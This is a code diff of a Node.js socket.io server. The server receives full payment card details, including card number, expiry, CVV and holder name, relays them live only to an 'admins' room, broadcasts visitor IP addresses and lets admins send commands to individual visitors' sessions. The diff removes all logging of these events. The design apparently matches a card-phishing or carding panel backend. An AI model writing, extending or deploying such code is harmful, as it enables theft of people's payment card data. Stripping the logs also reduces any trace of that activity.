@@ -14,7 +14,6 @@ const io = new Server(server, {
 });
 
 io.on('connection', (socket) => {
-  console.log('A client connected:', socket.id);
 
   // Global broadcast for any new connection
   const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
@@ -26,16 +25,11 @@ io.on('connection', (socket) => {
 
   // Handler for an admin identifying themselves
   socket.on('admin_hello', () => {
-    console.log(`Admin registered: ${socket.id}`);
     socket.join('admins');
   });
 
   // Handler for card data from a user
   socket.on('card_submission', (payload) => {
-    console.log('Received card submission:', {
-      socketId: socket.id,
-      payloadKeys: Object.keys(payload)
-    });
 
     // Validate required fields
     const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
@@ -61,11 +55,6 @@ io.on('connection', (socket) => {
     submissionPayload.card_type = detectCardType(cardNumber);
 
     // Send the data ONLY to admins
-    console.log('Sending card submission to admins:', {
-      id: submissionPayload.id,
-      card_type: submissionPayload.card_type,
-      amount: submissionPayload.amount
-    });
     io.to('admins').emit('card_submission', submissionPayload);
   });
 
@@ -80,7 +69,6 @@ io.on('connection', (socket) => {
 
   // Handler for commands from an admin
   socket.on('admin_command', (payload) => {
-    console.log('Server received admin_command:', payload);
     
     // Get the target socket ID from the payload
     const targetSocketId = payload.submission_id;
@@ -126,7 +114,6 @@ io.on('connection', (socket) => {
 
   // Global broadcast for a client disconnecting
   socket.on('disconnect', () => {
-    console.log('A client disconnected:', socket.id);
     io.emit('visitor_left', { id: socket.id });
   });
 });
